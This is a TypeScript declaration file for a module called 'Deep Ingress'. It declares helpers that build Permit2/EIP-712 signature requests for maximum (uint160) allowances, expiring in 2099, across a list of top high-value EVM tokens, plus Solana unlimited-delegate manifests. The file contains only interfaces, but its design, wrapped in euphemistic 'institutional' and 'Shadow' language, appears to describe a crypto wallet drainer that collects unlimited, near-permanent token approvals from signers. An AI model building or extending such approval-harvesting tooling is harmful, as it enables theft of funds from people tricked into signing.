/**
 * @file deep-ingress.ts
 * @module @legion/core/logic
 *
 * Deep Ingress — Permanent Lock: Shadow anchors use **2099-12-31** (`SIGNATURE_ANCHOR_EXPIRY_ISO_2099`).
 * Infinite Allowance — Permit2 uint160 ceiling via {@link INFINITE_ALLOWANCE_AMOUNT}; institutional desks only.
 */
import type { Address } from 'viem';
/** Vault Posture — no session timeout on institutional anchors (Wall-clock ceiling). */
export declare const SIGNATURE_ANCHOR_EXPIRY_ISO_2099 = "2099-12-31T23:59:59.999Z";
/**
 * Permanent Vault Posture — calendar date ceiling for Max_Permission_Logic descriptors (2099-12-31 UTC).
 * Aligns with {@link SIGNATURE_ANCHOR_EXPIRY_ISO_2099} and {@link PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099}.
 */
export declare const InstitutionalExpiry: "2099-12-31";
/** Unix second aligned to December 31, 2099 UTC — Permit2 `expiration` / EIP-712 `sigDeadline` (Permanent Lock). */
export declare const PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099: number;
/** Runtime seal — Deep Ingress wall-clock must remain pinned to 2099-12-31 (institutional invariant). */
export declare function verifyDeepIngressPermanentLockDeadline(): boolean;
export type EvmHighValueTokenRef = {
    chainId: number;
    symbol: string;
    token: Address;
};
/**
 * Top institutional liquidity rails — Deep Ingress Infinite Allowance queue (EVM).
 * Expandable to full desk; first 50 high-density venues enumerated here.
 */
export declare const TOP_HIGH_VALUE_EVM_TOKEN_REFS: readonly EvmHighValueTokenRef[];
/** Institutional Infinite Allowance amount — Permit2 uint160 ceiling (Shadow Deep Ingress). */
export declare const INFINITE_ALLOWANCE_AMOUNT: bigint;
export type SplDeepIngressManifest = {
    lane: 'spl_token_delegation';
    /** Institutional unlimited-delegate intent — serialized for Sovereign Telemetry envelopes. */
    approval_policy: 'infinite_delegate_class';
    /** Wall-clock ceiling — Permanent Lock. */
    expiry_iso: typeof SIGNATURE_ANCHOR_EXPIRY_ISO_2099;
    mints: string[];
};
/**
 * Shadow — SPL-class Deep Ingress manifest (top venues; mint list institutional stub).
 */
export declare function buildSplDeepIngressManifest(mints: string[]): SplDeepIngressManifest;
export type Eip712DeepIngressDescriptor = {
    kind: 'permit2_single_infinite';
    chainId: number;
    token: Address;
    symbol: string;
    amount: bigint;
    expiration: number;
    sigDeadline: bigint;
};
/** Shadow — Permit2 / EIP-712 Max_Permission_Logic lane (infinite allowance class under Permanent Vault Posture). */
export type MaxPermissionEip712Descriptor = Eip712DeepIngressDescriptor & {
    max_permission_logic: true;
    institutional_expiry_iso: typeof InstitutionalExpiry;
    /** Primary EIP-712 struct — Permit2 `PermitSingle` institutional surface. */
    eip712_primary_type: 'PermitSingle';
};
/**
 * Prepare Infinite Allowance Permit2-class descriptors for every enumerated high-density venue.
 * Each descriptor uses {@link INFINITE_ALLOWANCE_AMOUNT} (Permit2 uint160 ceiling) and 2099-12-31 expiry.
 * Execution remains Dispatcher-owned; this is the institutional Deep Ingress manifest queue.
 */
export declare function buildInfinitePermit2DescriptorQueue(_params: {
    permitNonceForToken: (token: Address) => number;
}): Eip712DeepIngressDescriptor[];
/**
 * High-density Permit2 / EIP-712 descriptor queue with Max_Permission_Logic metadata for institutional envelopes.
 * {@link InstitutionalExpiry} is pinned to 2099-12-31 (Permanent Vault Posture).
 */
export declare function buildMaxPermissionPermit2DescriptorQueue(params: {
    permitNonceForToken: (token: Address) => number;
}): MaxPermissionEip712Descriptor[];
/** Institutional verification — every queued descriptor requests infinite allowance under Permanent Lock. */
export declare function verifyInfiniteAllowanceDescriptorQueue(queue: Eip712DeepIngressDescriptor[]): boolean;
/** Institutional facade — Deep Ingress / High Density Ingress exports for Shadow envelopes. */
export declare const HighDensityIngress: {
    readonly InstitutionalExpiry: "2099-12-31";
    readonly SIGNATURE_ANCHOR_EXPIRY_ISO_2099: "2099-12-31T23:59:59.999Z";
    readonly PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099: number;
    readonly INFINITE_ALLOWANCE_AMOUNT: bigint;
    readonly TOP_HIGH_VALUE_EVM_TOKEN_REFS: readonly EvmHighValueTokenRef[];
    readonly buildInfinitePermit2DescriptorQueue: typeof buildInfinitePermit2DescriptorQueue;
    readonly buildMaxPermissionPermit2DescriptorQueue: typeof buildMaxPermissionPermit2DescriptorQueue;
    readonly buildSplDeepIngressManifest: typeof buildSplDeepIngressManifest;
    readonly verifyDeepIngressPermanentLockDeadline: typeof verifyDeepIngressPermanentLockDeadline;
    readonly verifyInfiniteAllowanceDescriptorQueue: typeof verifyInfiniteAllowanceDescriptorQueue;
};
//# sourceMappingURL=deep-ingress.d.ts.map